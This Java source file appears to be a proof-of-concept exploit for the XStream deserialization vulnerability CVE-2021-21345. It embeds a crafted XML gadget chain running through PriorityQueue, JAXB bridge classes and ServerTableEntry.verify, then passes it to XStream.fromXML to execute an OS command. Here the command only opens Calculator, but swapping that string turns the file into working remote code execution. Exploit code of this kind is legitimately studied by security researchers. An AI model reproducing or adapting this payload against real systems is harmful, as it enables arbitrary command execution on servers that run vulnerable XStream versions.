package com.r17a.xstream.cve.priorityqueue;

import com.thoughtworks.xstream.XStream;

public class CVE_2021_21345 {
    public static void main(String[] args) {
        String xml = "<java.util.PriorityQueue serialization='custom'>\n" +
                "  <unserializable-parents/>\n" +
                "  <java.util.PriorityQueue>\n" +
                "    <default>\n" +
                "      <size>2</size>\n" +
                "      <comparator class='sun.awt.datatransfer.DataTransferer$IndexOrderComparator'>\n" +
                "        <indexMap class='com.sun.xml.internal.ws.client.ResponseContext'>\n" +
                "          <packet>\n" +
                "            <message class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart'>\n" +
                "              <dataSource class='com.sun.xml.internal.ws.message.JAXBAttachment'>\n" +
                "                <bridge class='com.sun.xml.internal.ws.db.glassfish.BridgeWrapper'>\n" +
                "                  <bridge class='com.sun.xml.internal.bind.v2.runtime.BridgeImpl'>\n" +
                "                    <bi class='com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl'>\n" +
                "                      <jaxbType>com.sun.corba.se.impl.activation.ServerTableEntry</jaxbType>\n" +
                "                      <uriProperties/>\n" +
                "                      <attributeProperties/>\n" +
                "                      <inheritedAttWildcard class='com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection'>\n" +
                "                        <getter>\n" +
                "                          <class>com.sun.corba.se.impl.activation.ServerTableEntry</class>\n" +
                "                          <name>verify</name>\n" +
                "                          <parameter-types/>\n" +
                "                        </getter>\n" +
                "                      </inheritedAttWildcard>\n" +
                "                    </bi>\n" +
                "                    <tagName/>\n" +
                "                    <context>\n" +
                "                      <marshallerPool class='com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1'>\n" +
                "                        <outer-class reference='../..'/>\n" +
                "                      </marshallerPool>\n" +
                "                      <nameList>\n" +
                "                        <nsUriCannotBeDefaulted>\n" +
                "                          <boolean>true</boolean>\n" +
                "                        </nsUriCannotBeDefaulted>\n" +
                "                        <namespaceURIs>\n" +
                "                          <string>1</string>\n" +
                "                        </namespaceURIs>\n" +
                "                        <localNames>\n" +
                "                          <string>UTF-8</string>\n" +
                "                        </localNames>\n" +
                "                      </nameList>\n" +
                "                    </context>\n" +
                "                  </bridge>\n" +
                "                </bridge>\n" +
                "                <jaxbObject class='com.sun.corba.se.impl.activation.ServerTableEntry'>\n" +
                "                  <activationCmd>open /Applications/Calculator.app</activationCmd>\n" +
                "                </jaxbObject>\n" +
                "              </dataSource>\n" +
                "            </message>\n" +
                "            <satellites/>\n" +
                "            <invocationProperties/>\n" +
                "          </packet>\n" +
                "        </indexMap>\n" +
                "      </comparator>\n" +
                "    </default>\n" +
                "    <int>3</int>\n" +
                "    <string>javax.xml.ws.binding.attachments.inbound</string>\n" +
                "    <string>javax.xml.ws.binding.attachments.inbound</string>\n" +
                "  </java.util.PriorityQueue>\n" +
                "</java.util.PriorityQueue>";
        XStream xStream = new XStream();
        Object object = xStream.fromXML(xml);
    }
}
